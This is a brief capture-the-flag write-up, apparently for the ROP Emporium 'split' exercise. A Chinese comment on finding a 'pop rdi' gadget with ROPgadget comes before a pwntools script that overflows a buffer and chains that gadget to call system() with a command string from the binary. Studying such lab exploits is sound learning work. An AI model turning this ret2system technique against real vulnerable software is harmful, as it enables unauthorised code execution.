# split

用ROPgadget找到把放置在栈上的system函数的第一个参数弹出到rdi的汇编代码，传参顺序是rdi, rsi, rdx, rcx...

```python
import pwn
  
pwn.context(arch='amd64', os='linux', log_level='debug')

p = pwn.process('./split')
e = pwn.ELF('./split')

system_addr = pwn.p64(e.sym['system'])
sh_addr = pwn.p64(next(e.search(b'/bin/cat flag.txt')))

payload = b'A' * 0x20 + b'B' * 8 + pwn.p64(0x4007c3) + sh_addr + system_addr    # 0x4007c3 = ROPgadget --binary ./split | grep "pop rdi"
#                                     pop rdi; ret
p.sendlineafter(b'> ', payload)

p.recv()
p.recv()
```